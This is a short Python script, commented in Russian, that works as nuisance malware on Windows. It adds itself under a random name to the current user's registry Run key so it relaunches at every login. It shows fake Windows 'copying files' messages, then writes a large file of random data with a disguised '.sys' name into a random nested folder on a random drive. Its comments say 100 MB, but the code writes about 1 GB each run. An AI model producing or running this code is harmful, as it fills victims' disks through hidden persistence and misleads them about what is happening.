import os
import sys
import random
import time
import shutil
import string
import winreg
from pathlib import Path

def add_to_startup():
    """Добавляем скрипт в автозагрузку через реестр"""
    try:
        # Путь к текущему файлу
        script_path = os.path.abspath(sys.argv[0])
        
        # Открываем ветку автозагрузки для текущего пользователя
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg_key:
            # Добавляем запись с рандомным именем
            name = ''.join(random.choices(string.ascii_letters, k=8))
            winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, script_path)
        return True
    except Exception as e:
        print(f"Ошибка добавления в автозагрузку: {e}")
        return False

def create_sys_file():
    """Создаем .sys файл размером 100MB в случайной папке"""
    try:
        # Случайный диск (C:, D:, E: и т.д.)
        drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" 
                  if os.path.exists(f"{d}:\\")]
        
        if not drives:
            drives = [os.environ.get('SYSTEMDRIVE', 'C:\\')]
        
        # Случайная папка на диске
        base_path = random.choice(drives)
        
        # Создаем глубокую вложенную папку (макс 5 уровней)
        depth = random.randint(2, 5)
        current_path = base_path
        
        for _ in range(depth):
            folder = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            current_path = os.path.join(current_path, folder)
            
            try:
                os.makedirs(current_path, exist_ok=True)
            except:
                break
        
        # Генерируем имя для .sys файла
        file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + '.sys'
        file_path = os.path.join(current_path, file_name)
        
        # Создаем файл размером 100 МБ (100 * 1024 * 1024 байт)
        print("Создание системного файла...")
        with open(file_path, 'wb') as f:
            # Пишем блоками по 1MB для скорости
            block_size = 1024 * 1024  # 1 MB
            for _ in range(1000):  # 100 блоков = 100 MB
                f.write(os.urandom(block_size))
        
        print(f"Файл создан: {file_path}")
        return True
    except Exception as e:
        print(f"Ошибка создания файла: {e}")
        return False

def main():
    # Симуляция окна CMD
    print("[Windows] Идет копирование файлов...")
    time.sleep(10)
    
    print("[Windows] Логин..")
    time.sleep(2)
    
    # Добавляем в автозагрузку при первом запуске
    add_to_startup()
    
    # Создаем файл
    create_sys_file()
    
    # Пауза перед закрытием (чтобы увидеть результат)
    time.sleep(3)

if __name__ == "__main__":
    main()